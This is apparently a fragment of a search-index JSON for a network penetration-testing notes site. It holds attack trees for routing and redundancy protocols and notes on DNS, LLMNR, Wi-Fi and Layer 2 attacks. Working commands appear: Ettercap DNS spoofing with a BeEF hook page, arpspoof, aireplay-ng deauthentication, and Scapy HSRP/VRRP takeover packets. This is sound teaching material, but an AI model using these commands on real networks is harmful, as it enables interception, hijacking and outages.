HTTPS session spoofing an adversary uses stolen or counterfeit session tokens to initiate a new session and impersonate the original user, who might not be aware of the attack. The difference between HTTPS session spoofing and HTTPS spoofing lies in the timing of the attack. Session hijacking is done against a user who is logged in and authenticated, so from the target’s point of view the attack will most likely cause the application to behave unpredictably or crash. Homograph attack Register a domain name that is similar (using punycode for example) to the domain name of the target website (AND) Register its SSL certificate to make it look legitimate and secure Social engineering Send a link to the intended victim … Resources  Phishing with Unicode Domains , Xudong Zheng, April 14, 2017",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b899af76fca56b2f5c189a549b16ad72",
    "u": "https://network.tymyrddin.dev/docs/patches/is-is",
    "t": "Intermediate System to Intermediate System (IS-IS) ",
    "c": "Intermediate System to Intermediate System (IS-IS)  Table of Contents Intermediate System to Intermediate System (IS-IS) Attack tree for Is-Is Notes Attack tree for Is-Is  1. Compromise IS-IS Routing Tables (OR) 1.1. Spoof IS-IS Protocol Data Units (PDUs) (OR) 1.1.1. Forge Fake Hello (IIH) PDUs (Disrupt Adjacency Formation) 1.1.2. Inject Malicious Link-State PDUs (LSPs) 1.1.3. Replay Old PDUs (If Sequence Numbers Are Predictable) 1.2. Exploit Weak or Misconfigured Authentication (OR) 1.2.1. Crack MD5/HMAC Authentication (If Weak Keys Used) 1.2.2. Bypass Authentication (If Null/Plaintext Auth Enabled) 1.3. Manipulate IS-IS LSPs (OR) 1.3.1. Advertise Fake Links or Prefixes (Traffic Hijacking) 1.3.2. Trigger Frequent SPF Recalculations (CPU Exhaustion) 1.4. Exploit IS-IS Protocol Mechanics (OR) 1.4.1. Abuse Designated Intermediate System (DIS) Election 1.4.2. Send Malicious Sequence Number PDUs (LSP Corruption) 1.5. Man-in-the-Middle (MITM) Attacks (AND) 1.5.1. Intercept IS-IS Traffic (Required) 1.5.2. Modify or Inject Fake LSPs (Required) 2. Denial-of-Service (DoS) Against IS-IS (OR) 2.1. Flood IS-IS with Malicious PDUs 2.1.1. Send Excessive IIH PDUs (Prevent Adjacency Formation) 2.1.2. Generate Fake LSPs (Overwhelm SPF Calculations) 2.2. Exploit IS-IS Link-State Database (LSDB) (OR) 2.2.1. Fill LSDB with Bogus LSPs (Memory Exhaustion) 2.2.2. Trigger Constant LSP Flooding (Network Congestion) 2.3. Resource Exhaustion (OR) 2.3.1. Overload Router CPU with SPF Recalculations 2.3.2. Exhaust Bandwidth with LSP Storms 3. Information Leakage (OR) 3.1. Passive Eavesdropping on IS-IS Traffic 3.1.1. Capture Unencrypted LSPs (Topology Mapping) 3.2. Exploit IS-IS Hierarchical Design 3.2.1. Abuse Level 1/Level 2 Routing to Leak Routes Notes  IS-IS lacks native encryption, relying on MD5/HMAC for authentication. LSP manipulation is a primary attack vector (e.g., fake links reroute traffic). DIS election attacks can disrupt broadcast network stability.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1d4b2d2fce3da920aa9602d9f6b701ca",
    "u": "https://network.tymyrddin.dev/docs/notes/skirmishes",
    "t": "Name resolution skirmishes ",
    "c": "Name resolution skirmishes  Name-resolution exploits are exploits against technologies that resolve names to IP addresses, such as DNS, which works at the application layer and provides essential lookup services for devices connected to the Internet or a private network, the NetBIOS name service that converts computer names to IP addresses, and the Link-local Multicast Name Resolution (LLMNR) protocol that converts hostnames to an IPv4 or IPv6 address. Common name-resolution ports are UDP port 137 (NetBIOS name service), UDP 138 (NetBIOS datagram service), and TCP port 139 (NetBIOS session service). Hacking name resolution protocols is like hacking the telephone book of the internet or intranet. DNS offers a simple and silent variant of the man-in-the-middle attack (on-path attack, as it is now called). Most of the time you only have to spoof a single DNS response packet to hijack all packets of a connection. LLMNR is a protocol that allows name resolution without the requirement of a DNS server. It is able to provide a hostname-to-IP based off a multicast packet sent across the network asking all listening Network-Interfaces to reply if they are authoritatively known as the hostname in the query. You only have to respond authoritatively you can give what is asked after authentication. DNS attacks  DNS cache snooping DNS poisoning DNS amplification for DDoS attacks on other servers 2.1 Create a botnet to send thousands of lookup requests to open DNS servers (with a spoofed source address and configured to maximise the amount of data returned by each DNS server) DDoS attack against a DNS server itself DNS cache poisoning, also known as DNS spoofing, exploits vulnerabilities in the domain name system DNS to divert Internet traffic away from legitimate servers and towards fake ones. This kind of attack is often used for pharming. DNS amplification attacks exploit the open nature of DNS services to strengthen the force of distributed denial of service DDoS attacks. A DDoS attack against a DNS server can cause it to crash, rendering the users who rely on the sever unable to browse the web (users will still be able to reach recently visited websites if the DNS record is saved in a local cache). DNS cache snooping  Example: nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={host1,host2,host3}' <target> Arguments: dns-cache-snoop.mode : which of two supported snooping methods to use. nonrecursive , the default, checks if the server returns results for non-recursive queries. Some servers may disable this. timed measures the difference in time taken to resolve cached and non-cached hosts. This mode will pollute the DNS cache and can only be used once reliably. dns-cache-snoop.domains : an array of domain to check in place of the default list. The default list of domains to check consists of the top 50 most popular sites, each site being listed twice, once with “www.” and once without. The nmap cache snooping script can assist with cache snooping against an internal DNS server. Cache snooping shows where the targets are browsing on the Internet. This type of information disclosure can help aid in various attack scenarios: If knowing the websites the people (or a specific person) of an organisation frequents, a focused attack in which the web pages in the site are infected with malware is a possible attack vector (Waterholing). An attack method used to impersonate a victim’s DNS server, forcing them to navigate to a malicious website(DNS spoofing). The DNS resolver cache is overwritten on the DNS server with a malicious web address, and the user will receive the malicious site instead of the intended one (DNS cache poisoning). DNS spoofing  DNS spoofing can be achieved by DNS redirection, an attack in which an adversary modifies a DNS server in order to redirect a specific domain name to a different IP address. In many cases, the new IP address will be for a server controlled by the adversary which contains files infected with malware. Cache poisoning is another way to achieve DNS spoofing, without relying on DNS hijacking (physically taking over the DNS settings). An adversary inserts a forged DNS entry, containing an alternative IP destination for the same domain name, after which the DNS server resolves the domain to the spoofed website, until the cache is refreshed. DNS server spoofing attacks are often used to spread computer worms and viruses. This kind of attack is also often used for pharming. Example: DNS spoofing and cache poisoning  Use Ettercap : Modify the /etc/ettercap/etter.dns and add an entry to the file for the domain name “site.com” and have it point to the attack host. $ echo \"site.com A <IP address attack host>\" | sudo tee -a /etc/ettercap/etter.dns site.com A <IP address attack host> Create a web page named index.html in the /tmp directory of the attack host to load a JavaScript BeEF hook using the BeEF hook.js file: < HTML > < HEAD > < script src = \"http://site.com:3000/hook.js\" ></ script > </ HEAD > < BODY > You have been hooked! </ BODY > </ HTML > This is the web page the user will be directed to when they try to connect to site.com . Use either the Python http server module to host the web page on port 80, OR move the file to /var/www/html/ and start the apache2 server. # python -m SimpleHTTPServer 80 # service apache2 start Launch and login to BeEF Open a second terminal and use Nmap to identify other hosts by just using ARP packets by specifying the -sn flag to disable port scanning and using the -n flag to stop IP address resolution: # sudo nmap -n -sn <IP address attack host>/24 With a target host system found ( ) on the local network, find the gateway address for the local network using the ip route command: # ip route Establish an ARP poisoning session between the local network gateway ( ) and the target ( ) # ettercap -M arp:remote -T -q /<IP address gateway>// /<IP address target>// The -M flag sets up for MiTM (on-path), using the remote arp technique. The -T argument puts it in text-only mode. The -q argument prevents Ettercap from printing the full packet contents, to make the output more readable. The last part is the gateway and target in the format: MAC address/IPv4 addresses/IPv6 addresses/Ports . Not using the MAC adress, IPv6 adressess or ports explains the blanks and the slash delimiters. Enable the DNS plugin. Type p to list the plugins. Choose the dns-spoof plugin. When it is active and the victim navigates to the web page http://site.com/index.html , they will see the spoofed and hooked page. Inside the terminal with Ettercap, you can see the spoof succeed. To exit Ettercap, press q. In BeEF, see the target machine under the Online Browsers tab. From here, use BeEF to exploit the target further. Example: Forging redirection records for poisoning  Redirect the target domain’s name server (cache an additional A-record for ns.target.example: +---------------------+ | ANSWER | (no response) +---------------------+ | AUTHORITY | adversary.example. 3600 IN NS ns.target.example. +---------------------+ | ADDITIONAL | ns.target.example. IN A xxx.xxx.xxx.xxx +---------------------+ Redirect the NS record to another target domain (cache unrelated authority information for target.example’s NS-record): +---------------------+ | ANSWER | (no response) +---------------------+ | AUTHORITY | target.example. 3600 IN NS ns.adversary.example. +---------------------+ | ADDITIONAL | ns.adversary.example. IN A xxx.xxx.xxx.xxx +---------------------+ Attacking LLMNR and NetBIOS  LLMNR/NBT-NS poisoning can be done through SMB or through WPAD. Example: LLMNR/NBT-NS poisoning through SMB  When a Windows system tries to access an SMB share, it sends a request to the DNS server which then resolves the share name to the respective IP address and the requesting system can access it. When the provided share name does not exist, the system sends out an LLMNR query to the...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6a1fe435e906c34eb17055b33d9812f4",
    "u": "https://network.tymyrddin.dev/docs/patches/fhrp",
    "t": "First-Hop Redundancy Protocols (HSRP/VRRP) ",
    "c": "First-Hop Redundancy Protocols (HSRP/VRRP)  Table of Contents First-Hop Redundancy Protocols (HSRP/VRRP) Attack tree for HSRP Attack Tree for VRRP Key differences Common attack patterns HSRP-Specific Exploits Crafting Malicious HSRP Packets (Takeover Active Role) HSRP DoS via Fake Resign Messages VRRP-Specific Exploits VRRPv2 Master Takeover VRRPv2 DoS via Invalid VIPs Post-Takeover MITM attacks Defensive measures Attack tree for HSRP  1. Compromise HSRP Group (OR) 1.1. Spoof HSRP Messages (OR) 1.1.1. Forge Hello Packets (Take Over Active Router Role) 1.1.2. Modify Priority/Preemption Values 1.2. Exploit Weak Authentication (OR) 1.2.1. Crack Plaintext/MD5 Authentication 1.2.2. Bypass Authentication (If None Configured) 1.3. Cause Failover Disruption (OR) 1.3.1. Trigger Unnecessary Active-Standby Switches (DoS) 1.3.2. Send Fake Resign Messages (Force Role Changes) 2. Man-in-the-Middle (MITM) Attacks (AND) 2.1. Redirect Traffic via HSRP Takeover (AND) 2.1.1. Become Active Router (Required) 2.1.2. Intercept/Modify Traffic (Required) 3. Denial-of-Service (DoS) (OR) 3.1. Flood HSRP Groups (OR) 3.1.1. Send Excessive Hellos (Disrupt Election) 3.1.2. Advertise Invalid Virtual IPs (Confusion Attack) Attack Tree for VRRP  1. Compromise VRRP Group (OR) 1.1. Spoof VRRP Advertisements (OR) 1.1.1. Forge Master Router Advertisements 1.1.2. Manipulate Priority Values 1.2. Exploit Authentication Weaknesses (OR) 1.2.1. Crack Simple Text/MD5 Authentication 1.2.2. Exploit No Authentication (Default in VRRPv2) 1.3. Disrupt Failover (OR) 1.3.1. Force Unnecessary Master-Backup Transitions 1.3.2. Send Fake Shutdown Events 2. Traffic Interception (AND) 2.1. MITM via VRRP Takeover (AND) 2.1.1. Become Master Router (Required) 2.1.2. Redirect Traffic to Attacker Node (Required) 3. Denial-of-Service (OR) 3.1. Flood VRRP Groups (OR) 3.1.1. Overwhelm with Advertisements (Prevent Election) 3.1.2. Advertise Conflicting Virtual IPs Key differences  HSRP (Cisco Proprietary) uses UDP 224.0.0.2 (TTL=1). Default authentication = plaintext VRRP (IEEE Standard) uses 224.0.0.18 (IP Protocol 112). VRRPv3 supports IPv6 and improved auth Common attack patterns  Priority Spoofing: Attacker sets higher priority to become active/master. Authentication Bypass: Exploits weak/no auth to inject malicious packets. Failover Abuse: Forces unnecessary role changes causing instability. HSRP-Specific Exploits  Crafting Malicious HSRP Packets (Takeover Active Role)  Tool: Scapy (Python) Send forged HSRPv1/v2 Hello packets with: Source IP/MAC = Spoofed legitimate router Virtual IP = Target VIP Priority = 255 (highest, ensures takeover) Group ID = Target HSRP group Authentication = Default (plaintext) or brute-forced MD5 from scapy.all import * sendp ( Ether ( src = \"00:11:22:33:44:55\" , dst = \"01:00:5e:00:00:02\" ) / IP ( src = \"192.168.1.1\" , dst = \"224.0.0.2\" ) / UDP ( sport = 1985 , dport = 1985 ) / HSRP ( priority = 255 , group = 1 , virtualIP = \"192.168.1.254\" ), iface = \"eth0\" , loop = 1 ) Effect: Attacker becomes Active Router, intercepting traffic. HSRP DoS via Fake Resign Messages  Send HSRP Resign packet (state=0) from spoofed Active Router: HSRP ( opcode = 0 , state = 0 ) # Forces standby routers to re-elect Effect: Causes flapping, disrupting traffic. VRRP-Specific Exploits  VRRPv2 Master Takeover  Tool: Yersinia (yersinia -G) or Scapy Send VRRP Advertisement with: Priority = 255 (higher than current Master) Virtual IP = Target VIP Authentication = Simple text (default) or cracked MD5 sendp ( Ether ( dst = \"01:00:5e:00:00:12\" ) / IP ( src = \"192.168.1.1\" , dst = \"224.0.0.18\" , proto = 112 ) / VRRP ( vrid = 1 , priority = 255 , ipcount = 1 , addrlist = [ \"192.168.1.254\" ]), iface = \"eth0\" ) Effect: Attacker becomes Master, controls VIP traffic. VRRPv2 DoS via Invalid VIPs  Advertise conflicting VIPs (e.g., VIP = 0.0.0.0): VRRP ( addrlist = [ \"0.0.0.0\" ]) # Causes VIP conflicts Effect: Breaks redundancy, forcing manual recovery. Post-Takeover MITM attacks  ARP Poisoning: If VIP is shared, spoof ARP replies to redirect traffic. Traffic Interception: Use tools like ettercap or tcpdump on the new Active/Master router. Defensive measures  Authentication: Use HSRP MD5 or VRRPv3 IPsec AH (avoid plaintext). Network Segmentation: Restrict HSRP/VRRP multicast (224.0.0.2/18) to trusted switches (ACLs). Monitoring: Alert on priority changes (e.g., via SNMP traps).",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0629f154927e314c4f73bc60a4333e9b",
    "u": "https://network.tymyrddin.dev/docs/notes/intrusions",
    "t": "Wireless intrusions ",
    "c": "Wireless intrusions  For many years now, ISPs deliver a router including an access point. And Wi-fi is integrated into more devices than just homes or company LANs. Every mobile phone or tablet has Wi-fi support nowadays. The VoIP infrastructure of some supermarket announcements are routed over Wi-fi. Advertising panels in buses, railways and at stations, and even surveillance cameras often use Wi-fi as a transport medium. Wireless is cheap, individually deployable and popular and therefore often built into the most unexpected places, blind to the associated massive security risks. In this evolving industry with ever more devices connected to wireless networks, understanding wireless security threats and countermeasures is critical. Common attack vectors wireless  Many of the attacks on wireless networks involve eavesdropping, the process of capturing the traffic, making a copy of it so that it can be read if it is not encrypted (or cracking the encryption key if it is encrypted). An attacker can perform a man-in-the-middle (MiTM) attack (on-path attack), intercept the traffic, and then modify the traffic before forwarding it on to the wireless access point. Data corruption attack methods involve altering or corrupting the data so that it is not readable by the destination system. A relay attack is the capturing of a wireless signal and sending it somewhere else. This type of attack is commonly used to compromise vehicle key fobs. Using a special transmitter, an adversary can relay the signal from the key fob of a car to a teammate who receives the relayed signal to open the door of the car. Spoofing refers to altering a source address, whether that is the source MAC address or source IP address of a packet, or the source email address of an email message. It is a common phenomenon in wireless attacks for bypassing MAC filtering on a wireless access point. Common Wi-Fi attack scenarios  Sniff Wi-Fi traffic, and gain access: Connect to unencrypted network Connect to encrypted wireless network Break WEP encryption by FMS attack, Korek’s chop-chop, PTW attack, or a Caffe Latte attack Break WPA encryption by Beck-Tews attack, Halvorsen-Haugen attack, or Brute force PMK ARP/MAC spoofing (MitM) For a Denial of Service attack, Jam radio signal, flood with broadcast of frames, or use a disassociation/deauthentication attack WEP  WEP was the standard before WPA. The WEP encryption process uses the RC4 stream cipher. RC4 is a symmetric key cipher used to expand a short key into an infinite pseudo-random keystream. A number of flaws in the WEP algorithm seriously undermine the security claims of the system. Possible attacks are: Passive attacks to decrypt traffic based on statistical analysis. Active attack to inject new traffic from unauthorised mobile stations, based on known plaintext. Active attacks to decrypt traffic, based on tricking the access point. Dictionary-building attack that, after analysis of about a day’s worth of traffic, allows real-time automated decryption of all traffic. Key reuse in the encryption stream (24-bit IV) makes it vulnerable to cracking, as well as to fragmentation and replay attacks. aireplay-ng can be used to generate IV samples and aircrack-ng to decipher the secret key. You can also use wifite to conduct attacks against WEP. WPA and WPA2  WPA was introduced as an interim replacement for WEP and did not require consumers to replace hardware to support the new security measure. Instead, most vendors released software/firmware updates that could be installed on existing devices. There are multiple flavors of WPA based on the 802.11i wireless security standard: WPA, WPA2, and WPA3. WPA increased from 63-bit and 128-bit encryption in WEP to 256-bit encryption technology. WPA implemented the Temporal Key Integrity Protocol (TKIP) after WEP encryption was broken. TKIP is symmetric encryption that still uses the same WEP programming and RC4 encryption algorithm, but it encrypts each data packet with a stronger and unique encryption key. It also includes some additional security algorithms made up of a cryptographic message integrity check, IV sequence mechanism that includes hashing, a rekeying mechanism to ensure key generation after 10,000 packets, and to increase cryptographic strength, it includes a per-packet key-mixing function. These were designed to add protection against social engineering, replay and injection attacks, weak-key attacks, and forgery attempts. WPA2 introduced the use of the Advanced Encryption Standard (AES) instead of TKIP. After 2006, all new devices bearing the Wi-Fi trademark required mandatory WPA2 certification. WPA and WPA2 use a four-way handshake to establish connection. WPA3  Like WPA2, WPA3 uses AES and a four-way handshake. Its main difference with WPA2 is that it is designed for perfect-forward secrecy. This means that the encryption key changes such that its compromise will not result in a breach of data encrypted before that compromise took place. IOW, a privacy feature that prevents older data from being compromised by a later attack. Additionally, WPA3 uses Simultaneous Authentication of Equals (SAE) in an attempt to solve WPA and WPA2’s vulnerability to dictionary attacks. SAE is a type of key exchange also referred to as Dragonfly. WPA3 is weak to downgrade attacks and timing attacks. The Dragonblood vulnerabilities target the Dragonfly key exchange. Scanning and sniffing  In contrast to a Wi-fi scanner a Wi-fi sniffer passively reads the network traffic and in the best case evaluates also data frames beside beacon frames to extract information like SSID, channel and client IPs/MACs. Scanning Sniffing Probe-Request sniffing Sniffing for hidden SSID Probe-Request  If an operating system is sending out a probe request for every network it was connected to, an adversary can not only conclude where its owner has been, but may even get the WEP key (if that is still used) when it tries to connect to these networks and only receives a probe response(it then reveals its WEP key). Hidden SSID  The Hidden SSID feature avoids adding the SSID to the Beacon frames, but does not make it invisible. The SSID is also included in the probe request, the probe response and the association request packets. An adversary will only have to wait for a client and maybe disconnect it by sending a spoofed deauth. Deauthentication attacks  A deauthentication attack occurs when a hacker forces the access point to disconnect a wireless client from the access point. The client will automatically reconnect to the access point. Before deauthenticating, the adversary will start capturing wireless traffic to capture the authentication traffic (the handshake) when the client reconnects to the access point. The captured traffic can help crack the encryption key. Start capturing traffic Deautheticate clients Crack keys Example deauthentication attack  aireplay-ng -0 1 -a <MAC address of access point> -c <MAC address of target> wlan0mon Following is a list of the parameters: -0 tells Aireplay-ng to perform a deauthentication attack (you can also use –deauth). 1 specifies the number of deauthentication messages to send. You can use 0 for unlimited. -a is the MAC of the access point to send the message to. -c is the MAC address of the client to deauthenticate. If -c is not used, all clients are deauthenticated by the access point. wlan0mon is the interface to use. Cracking WEP  Verify wireless NIC Discover networks with Airodump-ng Capture traffic with Airodump-ng Associate with access point and replay traffic Crack the WEP key Verify wireless NIC  View and document wireless adapter: # airmon-ng Create an interface that runs in monitor mode: # airmon-ng start wlan0 Write down interface name (something like wlan0mon ) Discover networks with Airodump-ng  Display a list of wireless networks (Ctrl+C to stop): # airodump-ng wlan0mon The BSSID is the MAC address of the wireless access point that has been detected. PWR...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "13cb612955d86f1259ddb95a44d67fd7",
    "u": "https://network.tymyrddin.dev/docs/notes/altercations",
    "t": "Network access altercations ",
    "c": "Network access altercations  Hacking Layer 2, responsible for addressing packets in an Ethernet with the use of MAC addresses. OSI was built to allow different layers to work without knowledge of each other. This means if one layer is hacked, communications are compromised without the other layers being aware of the problem. Security is only as strong as the weakest link, and when it comes to networking, layer 2 can be a VERY weak link. There are two different addressing schemes for computers on a LAN, the global IP address and the local MAC address. The Address Resolution Protocol (ARP) was created to carry IP traffic. By merely injecting two ARP Reply packets into a trusting LAN, any device is able to receive all traffic going back and forth between any two devices on the LAN. Simple ARP spoofing  The terms ARP Spoofing and ARP poisoning are generally used interchangeably. Technically, spoofing refers to an attacker impersonating another machine’s MAC address, while poisoning denotes the act of corrupting the ARP tables on one or more victim machines. In practice, these are both sub-elements of the same attack, and both terms are used to refer to the attack as a whole. Other terms used may be ARP cache poisoning or ARP table corruption. In an ARP spoofing attack, an adversary sends spoofed ARP messages over a LAN in order to link the adversary’s MAC address with the IP address of a legitimate member of the network. Data that is intended for the host’s IP address gets sent to the adversary instead. ARP spoofing can be used to steal information, modify data-in-transit or stop traffic on a LAN. ARP spoofing attacks can also be used to facilitate other types of attacks, including DoS attacks, session hijacking and MitM attacks. Use an ARP spoofing tool such as Arpspoof, Cain & Abel, Arpoison, or Ettercap: Set the IP address of the tool to match the IP subnet of the victim (scans the network to find the IP address and MAC address of all the hosts on the subnetwork) Select a target Send ARP packet, replacing the MAC address of the target with own MAC address while keeping IP address as is, causing packets meant for the target now being rerouted to the attacker. When packets for the victim arrive, launch further attacks: Associate multiple IP addresses to a single MAC address on a network (IP aliasing) Sit in between the communication between two users (MitM) Hijack session (network) Perform a DoS Example: # echo 1 > /proc/sys/net/ipv4/ip_forward # arpspoof -i <interface> -t <target IP address 1> <target IP address 2> # arpspoof -i <interface> -t <target IP address 2> <target IP address 1> Network ARP cache poisoning  All the devices that are connected to the layer 2 network have an ARP cache. This cache contains the mapping of all the MAC and IP address for the network devices that particular host has already communicated with. Many network switches when overloaded can start acting like a hub and start broadcasting all the network traffic to all the hosts connected to the network. As a hub, the switch does not enable its port security feature, and now it broadcasts all the network traffic. Sniff. Poisoning ARP cache remotely is at minimum a 2-step exploitation chain, as it requires either physical access to the network or control of one of the machines in the network. Craft a valid ARP reply in which any IP is mapped to any MAC address Broadcast this message. All the devices on network will accept this message and will update their ARP table with new Information Gain control of the communication from any host in the network. Send an ARP reply mapping an IP address on network with a wrong or non-existent MAC address. For example, a fake ARP reply mapping the network router IP with a non-existent MAC will bring down the whole network. Send an ARP reply to the router mapping a particular host IP to your attack machine MAC address and another ARP reply to the host machine mapping the router IP to your attack machine MAC address. Flood switch and sniff. Attacking the spanning tree protocol  In switched networks, when two network segments are connected by more than two layer 2 switches, this creates a physical switching loop in the topology, resulting in broadcast radiations and MAC table instability. Interconnecting the switches with redundant links helps some, but creates transmission loops. The Spanning Tree Protocol (STP) is a layer 2 protocol that runs on network devices such as bridges and switches. Its primary function is to prevent looping in networks that have redundant paths by placing only one switch port in forwarding mode, and all other ports connected to the same network segment in blocking mode. Bridge Protocol Data Units (BPDUs) are the update frames that are multicast between switches over the network regularly to determine if a port is in a forwarding or blocking state and to determine the root bridge during the election process. Capture STP packets on the LAN Determine version (STP, RSTP, or MST) by inspecting the Bridge Protocol Data Units (BPDUs) Craft malicious BPDUs of a nonexistent switch to elect it as the new root bridge VLAN hopping attacks  Using VLAN hopping attack, an attacker can sniff network traffic from another VLAN using a sniffer or send traffic from one VLAN to another VLAN. Switch spoofing Double tagging Switch spoofing  Dynamic Trunking Protocol (DTP) is used to dynamically build trunk links between two switches. dynamic desirable (default), dynamic auto and trunk modes are used to configure an interface to allow dynamic trunking and frame tagging. A switch interface which is connected to an end device is normally in access mode and the end device will have access to its own VLAN. Traffic from other VLANs are not forwarded via the interface. In switch spoofing, an adversary can generate Dynamic Trunking Protocol (DTP) messages to form a trunk link between the attack machine and the switch, as a result of a default configuration or an improperly configured switch. If a switch is configured with the default values, and an adversary announces his/her attack machine is a trunk port, the switch will trunk all VLANs over the switch port that the attack machine is plugged into. The attacker will now have access to all VLAN traffic destined for the switch. Double tagging  Double tagging happens when an adversary can connect to an interface which belongs to the native VLAN of the trunk port. Double tagging attack is unidirectional. The attack takes advantage of 802.1Q tagging and the tag removal process of many types of switches. Many switches remove only one 802.1Q tag. In Double tagging attack, an attacker changes the original frame to add two VLAN tags: An outer tag of his own VLAN and an inner hidden tag of the victim’s VLAN. The adversary’s attack machine must belong to the native VLAN of the trunk link. Bypassing access controls  NNetwork access control (NAC), either in hardware or software, supports network visibility and access management through policy enforcement on devices and users of corporate networks, and can quarantine rogue devices that are not identified in a network security policy. In cloud-based environments, a customer can use Network Security Groups (NSG) or similar to enforce and control Internet or intranet communications across different workloads within virtual networks. The most common ways to try to bypass NAC: Spoofing the MAC and IP addresses of a device that cannot natively participate in NAC, such as a VoIP phone or printer. These devices will be whitelisted by the administrator, and often there is no mechanism to verify that MAC address truly belongs to the device. Using IPv6 rather than IPv4 on the unauthorized device. Most servers have IPv6 addresses by default, and are running IPv6, but administrators still forget to include IPv6 rules in firewalls and NAC policy. Using a rogue wireless access point to get an authorized device to connect with an attacker machine. The attacker machine...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "438440664d3ffc783471f094dc6e8cc7",
    "u": "https://network.tymyrddin.dev/docs/roots/readme",
    "t": "Rootways of the World Tree ",
    "c": "Rootways of the World Tree  Vast, ancient roots intertwining beneath continents—essential for life, but vulnerable where they surface. When data needs to leave one network and enter another, like when you load a website hosted halfway across the world, things get more complicated. This is where BGP (Border Gateway Protocol) comes in. Unlike the neighborhood routes, BGP isn’t about finding the shortest path. It is about finding the most acceptable one. BGP works like a postal service where each network announces: “Hey, I know how to reach these addresses!” Other networks then decide whether to trust that announcement based on business relationships (like paid transit deals or mutual “peering” agreements). Because BGP runs over TCP (the same protocol that powers web browsing and emails), these route updates are delivered safely, even over unstable connections. The hidden challenges  BGP was not designed with strong security in mind, so sometimes mistakes (or malicious attacks) can cause traffic to take wrong turns. There have been cases where huge chunks of the Internet were briefly “hijacked” because of a misconfigured BGP announcement. Tools like RPKI (a kind of cryptographic ID check for routes) are slowly making this harder to exploit, but the system still relies heavily on trust. Why this matters  Every time you send a message, stream a video, or load a webpage, this invisible dance of protocols is happening in the background. BGP stitches together the Internet’s fragmented networks, while the underlying tech (TCP, IP, and error-checking systems like ICMP) keeps the whole thing running smoothly. It is not perfect. Below are the attack trees on some of the various components that hold the digital world together: Transmission Control Protocol Internet Protocol Border Gateway Protocol BGPsec validation Internet Control Message Protocol Domain Name System TLS/SSL (for BGPsec) TCP-AO (Authentication Option) MD5 (for TCP-AO) Resource Public Key Infrastructure",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bf3015f817b0dc2f5f0de833c8e53701",
    "u": "https://network.tymyrddin.dev/docs/patches/eigrp",
    "t": "Enhanced Interior Gateway Routing Protocol (EIGRP) ",
    "c": "Enhanced Interior Gateway Routing Protocol (EIGRP)  Table of Contents Enhanced Interior Gateway Routing Protocol (EIGRP) Attack tree for EIGRP Notes Attack tree for EIGRP  1. Compromise EIGRP Routing Tables (OR) 1.1. Spoof EIGRP Messages (OR) 1.1.1. Forge Fake Hello Packets (Disrupt Neighbor Adjacency) 1.1.2. Inject Malicious Update/Query/Reply Packets 1.1.3. Replay Old EIGRP Messages (If Sequence Numbers Are Predictable) 1.2. Exploit Weak or Misconfigured Authentication (OR) 1.2.1. Crack MD5 Authentication (If Weak Key Used) 1.2.2. Bypass Authentication (If None Configured) 1.3. Manipulate EIGRP Metrics (OR) 1.3.1. Advertise False Bandwidth/Delay Values (Traffic Hijacking) 1.3.2. Trigger Route Flapping (Constant Route Recalculations) 1.4. Exploit EIGRP Protocol Mechanics (OR) 1.4.1. Abuse DUAL Finite State Machine (Stuck-in-Active Attacks) 1.4.2. Exhaust Router Resources with Excessive Queries 1.5. Man-in-the-Middle (MITM) Attacks (AND) 1.5.1. Intercept EIGRP Traffic (Required) 1.5.2. Modify or Inject Fake Routes (Required) 2. Denial-of-Service (DoS) Against EIGRP (OR) 2.1. Flood EIGRP with Malicious Packets 2.1.1. Send Excessive Hello/Update Packets (Overwhelm CPU) 2.1.2. Generate Fake Queries/Replies (Trigger DUAL Loops) 2.2. Exploit EIGRP’s DUAL Algorithm (OR) 2.2.1. Force Stuck-in-Active (SIA) Condition 2.2.2. Cause Route Oscillations (Unstable Network) 2.3. Resource Exhaustion (OR) 2.3.1. Fill Topology Table with Bogus Routes 2.3.2. Overload Router Memory/CPU with EIGRP Processing 3. Information Leakage (OR) 3.1. Passive Eavesdropping on EIGRP Traffic 3.1.1. Capture Unencrypted EIGRP Updates 3.2. Network Topology Discovery 3.2.1. Analyze EIGRP Topology Tables (If Leaked) Notes  EIGRP’s reliance on MD5 authentication (no SHA support) makes it vulnerable to brute force if weak keys are used. Stuck-in-Active (SIA) attacks are unique to EIGRP due to its DUAL algorithm. Unlike RIP, EIGRP is more complex, so attacks often target protocol logic rather than just spoofing.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fda84a4318c9646086985518638cf495",
    "u": "https://network.tymyrddin.dev/docs/thm/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Simulating hacker-style attacks on network assets to detect and exploit security misconfiguration, network vulnerabilities, and threats like open ports, vulnerable devices, or outdated software running on the network. Why?  To build experience with threat intelligence and network penetration testing to replicate accurately a full scenario of a targeted attack against an entire organisation including people, processes and technologies. How?  Attacktive directory Attacking kerberos",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "471e4dd7fc1e86f89de3bbe7f583eeae",
    "u": "https://network.tymyrddin.dev/docs/patches/readme",
    "t": "Mycelium patches ",
    "c": "Mycelium patches  A fungal network nourishing a single forest grove: intricate, local, and fiercely protected. Inside a single company or ISP, routers use protocols like OSPF or EIGRP to keep track of the best paths, almost like how you might memorize the quickest way to your local grocery store. These protocols update automatically if a link goes down, ensuring traffic takes the next best route without humans needing to intervene. The hidden challenges  When deploying routing protocols in an intranet, several hidden security challenges can arise, often overlooked during initial setup. These vulnerabilities can lead to unauthorized access, route manipulation, denial-of-service (DoS) attacks, and data interception. And even in intranets, misconfigured BGP can leak internal routes to the internet. Why this matters  Routing protocols are the hidden hyphae of your Mycelium Patch—if rot takes hold, spore-thieves can drain your nectar, strangle fruiting bodies, or twist the whole web into a strangler’s knot. Here’s why decay spreads unseen: Routing Information Protocol Enhanced Interior Gateway Routing Protocol Open Shortest Path First Intermediate System to Intermediate System Border Gateway Protocol Static Routing First-Hop Redundancy Protocols",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8ca2972d4d8a058987a53a4e371e57eb",
    "u": "https://network.tymyrddin.dev/docs/roots/ip",
